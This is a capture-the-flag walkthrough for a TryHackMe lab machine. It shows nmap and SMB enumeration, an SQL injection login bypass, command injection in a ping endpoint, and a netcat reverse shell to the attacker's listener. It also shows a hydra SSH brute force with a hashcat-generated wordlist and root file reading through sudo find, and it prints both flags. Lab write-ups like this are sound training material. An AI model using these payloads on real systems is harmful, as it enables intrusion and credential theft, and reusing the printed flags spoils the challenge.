
An Easy CTF challenge from the Junior Penetration Tester path on TryHackMe.

Description: *You are up for promotion at **Hadron Security**. Your senior lead, Mara, has handed you a solo engagement against **RecruitCorp**, a small recruiting firm with a public-facing portal. Compromise the host, capture the flags, and demonstrate that you are ready for the Penetration Tester title.*

There are two flags to capture - `user.txt` and `flag.txt`.

First thing to do is always `nmap` scan - `nmap -A -v -T4 -p- MACHINE_IP`

The results of the scan:

```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 1e:e2:fc:69:ad:75:40:08:c9:82:90:50:0c:85:a8:3b (ECDSA)
|_  256 c8:1c:1d:61:ff:a2:d4:10:fe:45:56:7f:0f:ad:d5:cc (ED25519)
80/tcp  open  http        Apache httpd 2.4.58 ((Ubuntu))
|_http-title: RecruitCorp - Careers Portal
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.58 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/admin/
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
```

Few things to notice:
- http apache server on port 80
- `/admin` disallowed in `robots.txt`
- smb share present.

I started with smb. Using `smbclient -L //10.113.189.209 -N`. There is a share called `public` which has `README.txt` file in it. I proceed with downloading it. The content of the file was:
```
This share is reserved for future internal file distribution.
Nothing to see here yet.
- IT
```
I left it for now.

Next, I looked at webpage.
Started with looking into source code of the main page and `/admin`, but there was nothing in there, next I started fuzzing for files and endpoints: `gobuster dir -u 'url' -w /usr/share/wordlists/dirb/big.txt -x .php,.txt,.jsp,.json,.asp,.js,.py -b 403-500`

I found:
```
/admin                (Status: 301) [Size: 316] [--> http://10.113.189.209/admin/]
/index.php            (Status: 200) [Size: 1620]
/robots.txt           (Status: 200) [Size: 32]
/robots.txt           (Status: 200) [Size: 32]
```

For now, the only option is to bruteforce admin login page.
I used `ffuf` to do this job.
`ffuf -u http://10.113.189.209/admin/ -w /usr/share/wordlists/rockyou.txt -X POST -d "username=admin&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -fr "Invalid credentials."`

Bruteforcing admin panel didn't went very well, so I tried other options.
In the `username` field I tried simple SQLi payload `admin' --` and literally anything in the `password`. And it worked! I'm the admin now.

There is user lookup functionality in the admin panel. You can put an `id` value there and check a user. It is going to `/admin/users/lookup.php?id=1`- there is parameter worth checking.
During enumerating users with this functionality, I spotted that the user with id `7`, `sysmaint` is a service account, and the note to this user says: `Service account for /admin/sysmaint-checks/ping.php. Do not disable.`
I visited `/admin/sysmaint-checks/ping.php` and there is a usage clue: `/ping.php?host=<target>`. So first I tried with localhost addresses and it's different variations. It went through. Functionalities like this are often vulnerable to Remote Code Execution, so I tried - `/ping.php?host=localhost|whoami` and in the response I noticed: `www-data`.
So the next step is to get reverse shell, I used `busybox nc 10.113.126.162 1337 -e bash` and I got hit in my nc listener.
I upgraded a shell with `python3 -c 'import pty;pty.spawn("/bin/bash")'`.

In the `/var/www/html/config` I found a file `db.conf` and it's contents were:
```
# RecruitCorp application database config
# Pulled out of source control - DO NOT COMMIT.
db_host=localhost
db_name=recruitcorp
db_user=jford
db_pass_hash=$2b$10$QzkXmGndA2cQLozO3xAN6eWKrl6ZXyzhYTJNF67exOmTmN5oVSEfq
db_engine=sqlite3
```

I tried to crack this hash but with no success.
So, the next step is to bruteforce ssh for `jford` user with a custom wordlist.
On the main page I found a note about Spring 2026 Hiring Drive. So I used `spring2026` as a base to create a wordlist.
`echo "spring2026" > base.txt`
`hashcat --stdout base.txt -r /usr/local/hashcat/rules/dive.rule > wordlist.txt`

And with created wordlist I tried to bruteforce ssh for `jford` with hydra.
`hydra -l jford -P wordlist.txt 10.113.189.209 ssh`

And after a few minutes, I got the password:
```
[22][ssh] host: 10.113.189.209   login: jford   password: spring2026!
```

I used ssh to connect to the machine as a `jford`.
And in his home directory was a first flag - `user.txt`.
`THM{bdbee0a91ebcb0b0fafde931223efe09}`

Now, I need to escalate to root in order to grab a second flag.
During enumeration I used `sudo -l` command to see if I can use any binary with sudo without a password. And there was one: `/usr/bin/find`.
I went straight to `gtfobins.org`. There I found out that I can read any file on the system with `find /path/to/input-file -exec cat {} \;`.
So, I adjusted a payload: `sudo find /root/flag.txt -exec cat {} \;` and I read a second flag.
`THM{d999a1f6319a9c5b48c067dfab314ba2}`
